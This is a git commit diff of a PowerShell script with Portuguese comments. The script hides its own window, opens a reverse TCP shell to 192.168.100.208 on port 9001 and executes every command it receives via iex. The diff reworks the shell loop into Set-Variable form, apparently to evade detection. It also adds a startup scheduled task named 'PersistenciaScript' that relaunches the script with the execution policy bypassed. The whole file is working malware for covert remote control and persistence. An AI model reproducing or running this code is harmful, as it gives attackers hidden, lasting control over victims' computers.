a8169ff61150dfd91ccfe37a93ebcb98ae82e25d
Xandrei7 <155474631+Xandrei7@users.noreply.github.com>
2024-02-10 15:47:18 -0400

    shellms2.ps1

--- shellms2.ps1
+++ shellms2.ps1
@@ -1,3 +1,4 @@
+# Tenta ocultar a janela do PowerShell
 Start-Sleep -Seconds 3
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("user32.dll")]
@@ -5,15 +6,21 @@ public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 '
 [Console.Window]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
-$ip = "192.168.100.208"
-$port = 9001
-$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-$stream = $client.GetStream()
-$bytes = New-Object Byte[] 65536
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
-    $sendback = iex $data 2>&1 | Out-String
-    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
-    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
-    $stream.Write($sendbyte,0,$sendbyte.Length)
-   
+# Estabelece a conexão TCP e executa comandos recebidos
+Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("192.168.100.208",9001));
+Set-Variable -Name stream -Value ($client.GetStream());
+[byte[]]$bytes = 0..65535|%{0};
+while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){
+    Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));
+    Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String);
+    Set-Variable -Name sendback2 -Value ($sendback + "PS " + (pwd).Path + "> ");
+    Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close()
+
+$scriptPath = $MyInvocation.MyCommand.Definition
+$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PersistenciaScript" -Description "Mantém o script rodando após reiniciar" -ErrorAction SilentlyContinue
